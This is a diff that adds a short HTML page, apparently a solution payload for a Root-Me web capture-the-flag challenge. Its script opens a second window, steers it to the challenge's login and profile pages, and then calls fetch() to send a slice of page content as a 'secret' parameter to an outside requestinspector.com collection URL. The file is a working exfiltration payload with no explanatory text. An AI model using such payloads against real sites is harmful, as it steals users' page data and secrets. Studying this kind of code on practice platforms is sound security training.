@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html lang="en">
+<body>
+<script>
+  var bad2 = open("");
+  location = "http://challenge01.root-me.org:58003/profile";
+  bad2.location = "http://challenge01.root-me.org:58003/login";
+  bad2.opener.alert(fetch('https://01jhb503e78kwgffsh4r85hx3p00-6bcfda00677b285b05f6.requestinspector.com?secret='.concat(document.body.innerHTML.substr(-30,13))));
+</script>
+</body>
+</html>
